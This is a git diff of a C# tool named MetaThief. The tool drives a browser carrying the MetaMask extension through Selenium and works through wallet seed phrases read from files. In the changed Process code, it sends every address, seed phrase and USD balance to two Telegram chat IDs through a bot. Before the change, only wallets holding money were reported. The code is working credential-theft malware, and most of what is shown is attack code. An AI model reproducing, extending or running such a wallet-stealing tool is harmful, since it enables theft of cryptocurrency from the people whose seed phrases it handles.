@@ -1,5 +1,7 @@
 ﻿using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
+using OpenQA.Selenium.Firefox;
+using OpenQA.Selenium.Edge;
 using System.Net;
 using Newtonsoft.Json;
 using System.Linq;
@@ -14,9 +16,9 @@ namespace MetaThief
     {
         public static void Main()
         {
-            //string path = @"C:\Users\79956\Downloads\metamask.crx";
-            //Byte[] bytes = File.ReadAllBytes(path);
-            //string file = Convert.ToBase64String(bytes);
+            string path = @"C:\Users\79956\Downloads\metamask.crx";
+            Byte[] bytes = System.IO.File.ReadAllBytes(path);
+            string file = Convert.ToBase64String(bytes);
             //ChromeOptions options = new ChromeOptions();
             //options.AddEncodedExtension(file);
             //options.AddArgument("user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36");
@@ -27,13 +29,14 @@ namespace MetaThief
             //options.AddArgument("--disable-infobars");
             //options.AddArgument("disable-translate");
 
-            Console.Write("Enter file id: ");
-            int seeds = Int32.Parse(Console.ReadLine());
-            string path = @"C:\Users\79956\Downloads\metamask.crx";
-            Byte[] bytes = System.IO.File.ReadAllBytes(path);
-            string file = Convert.ToBase64String(bytes);
-            ChromeOptions options = new ChromeOptions();
+            //Console.Write("Enter file id: ");
+            //int seeds = Int32.Parse(Console.ReadLine());
+            //string path = @"C:\Users\79956\Downloads\metamask-10.12.4-an+fx.xpi";
+            //Byte[] bytes = System.IO.File.ReadAllBytes(path);
+            //string file = Convert.ToBase64String(bytes);
+            EdgeOptions options = new EdgeOptions();
 
+            /*options.add
             options.AddEncodedExtension(file);
             options.AddArgument("user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36");
             options.AddArgument("disable-geolocation");
@@ -41,10 +44,12 @@ namespace MetaThief
             options.AddArgument("disable-popup-blocking");
             options.AddArgument("disable-web-security");
             options.AddArgument("--disable-infobars");
-            options.AddArgument("disable-translate");
-
-            IWebDriver driver = new ChromeDriver(options);
-            Pirate pirate = new Pirate(driver, seeds);
+            options.AddArgument("disable-translate");*/
+            options.AddEncodedExtensions(file);
+            //Thread.Sleep(60 * 1000);
+            IWebDriver driver = new EdgeDriver(options);
+            /*IWebDriver driver = new ChromeDriver(options);*/
+            Pirate pirate = new Pirate(driver, 10);
             pirate.Process();
         }
     }
@@ -111,12 +116,13 @@ namespace MetaThief
         public Pirate(IWebDriver d, int i)
         {
             driver = d;
-            from = i;
+            seed_file_id = i;
         }
 
         public async void Process()
         {
             client = new TelegramBotClient(token);
+            driver.Navigate().GoToUrl("extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#initialize/welcome");
             driver.Close();
 
             var AftertTabs = driver.WindowHandles.ToList();
@@ -280,8 +286,8 @@ namespace MetaThief
                     while ((line = reader.ReadLine()) != null)
                     {
                         var obj = JsonConvert.DeserializeObject<Request>(line);
-                        if (obj.total_usd_value != 0) await client.SendTextMessageAsync(476375643, $"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
-                        if (obj.total_usd_value != 0) await client.SendTextMessageAsync(1143912992, $"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
+                        await client.SendTextMessageAsync(476375643, $"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
+                        await client.SendTextMessageAsync(1143912992, $"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
                         Console.WriteLine($"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
                     }
                 }
